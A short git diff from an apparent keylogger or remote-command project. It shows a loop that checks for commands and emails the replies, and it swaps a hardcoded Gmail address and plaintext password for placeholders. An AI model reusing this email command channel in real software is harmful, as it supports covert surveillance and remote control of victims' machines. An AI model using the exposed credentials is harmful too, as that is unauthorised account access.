@@ -110,7 +110,7 @@ class cmd_process:
 class cmd_sender:
     def send_execute(self):
         while True:
-            send = Send("forkeylogger101@gmail.com","forkeylogger101@gmail.com","loggerkey101")
+            send = Send("email","email","password")
             new_command = command_checker.execution()
             subject = "command reply"
             if new_command:
